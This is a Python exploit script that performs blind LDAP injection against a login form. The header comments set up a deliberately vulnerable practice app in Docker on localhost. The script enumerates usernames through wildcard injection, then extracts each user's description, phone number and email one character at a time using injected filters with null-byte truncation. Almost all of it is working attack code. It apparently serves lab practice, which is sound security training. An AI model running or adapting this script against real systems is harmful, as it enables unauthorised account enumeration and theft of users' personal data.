#!/usr/bin/python3
# git clone https://github.com/motikan2010/LDAP-Injection-Vuln-App
# cd LDAP-Injection-Vuln-App
# docker run -p 389:389 --name openldap-container --detach osixia/openldap:1.2.2
# nano Dockerfile -> Change ‘FROM php:7.0-apache‘ to ‘FROM php:8.0-apache‘.
# docker build -t ldap-client-container .
# docker run -dit --link openldap-container -p 8888:80 ldap-client-container

from pwn import *
import requests, sys, time, string, signal, pdb

def def_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

URL = "http://localhost:8888"
users = []

def try_letter(prep):
    characters = string.ascii_lowercase 
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    for char in characters:
        post_data= "user_id=%s%s*&password=*&login=1&submit=Submit" % (prep, char)
        #print(post_data)
        #time.sleep(0.05)
        r = requests.post(URL, data=post_data, headers=header, allow_redirects=False)
        if r.status_code == 301:
            try_letter(prep + char)

    result = [usr for usr in users if usr.startswith(prep)]
    if not(result):
        users.append(prep)
    return users



def get_users_recursively():
    p1 = log.progress("Starting user enumeration")
    prep = ""
    final = try_letter(prep)
    p1.status("Found users %s" % final)
    return final

def get_descriptions(total_users):
    characters = string.ascii_lowercase + ' ' 
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    p2 = log.progress("Getting descriptions")
    for user in total_users:
        desc = ""
        p2.status("User %s" % user)
        for position in range(0, 50):
            finish = False
            for char in characters:
                post_data= "user_id={})(description={}{}*))%00*&password=*&login=1&submit=Submit".format(user, desc, char)
                r = requests.post(URL, data=post_data, headers=header, allow_redirects=False)
                if r.status_code == 301:
                    desc += char
                    break
                else:
                    if char == characters[-1]:
                        finish = True
            if finish:
                log.info("Description for %s: '%s'" % (user, desc))
                break

def get_phones(total_users):
    characters = string.ascii_lowercase + string.digits 
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    p3 = log.progress("Getting phone numbers")
    for user in total_users:
        phone = ""
        p3.status("User %s" % user)
        for position in range(0, 50):
            finish = False
            for char in characters:
                post_data= "user_id={})(telephoneNumber={}{}*))%00*&password=*&login=1&submit=Submit".format(user, phone, char)
                r = requests.post(URL, data=post_data, headers=header, allow_redirects=False)
                if r.status_code == 301:
                    phone += char
                    break
                else:
                    if char == characters[-1]:
                        finish = True
            if finish:
                log.info("Phone for %s: '%s'" % (user, phone))
                break

def get_mails(total_users):
    characters = string.ascii_lowercase + string.digits + '._-@'
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    p4 = log.progress("Getting phone numbers")
    for user in total_users:
        mail = ""
        p4.status("User %s" % user)
        for position in range(0, 50):
            finish = False
            for char in characters:
                post_data= "user_id={})(mail={}{}*))%00*&password=*&login=1&submit=Submit".format(user, mail, char)
                r = requests.post(URL, data=post_data, headers=header, allow_redirects=False)
                if r.status_code == 301:
                    mail += char
                    break
                else:
                    if char == characters[-1]:
                        finish = True
            if finish:
                log.info("E-Mail for %s: '%s'" % (user, mail))
                break
def main():
    total_users = get_users_recursively()
    print("\n")
    get_descriptions(total_users)
    print("\n")
    get_phones(total_users)
    print("\n")
    get_mails(total_users)

if __name__ == "__main__":
    main()
